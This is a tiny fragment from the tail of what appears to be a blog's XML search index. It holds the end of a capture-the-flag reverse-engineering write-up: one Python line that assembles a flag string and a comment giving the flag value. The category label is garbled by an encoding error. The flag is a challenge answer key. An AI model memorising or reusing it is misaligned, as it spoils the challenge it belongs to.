'flag&#123;'+''.join(flag)+'&#125;'#flag&#123;1134240024&#125;]]></content>
      <categories>
        <category>ÈÄÜÂêë</category>
      </categories>
  </entry>
</search>
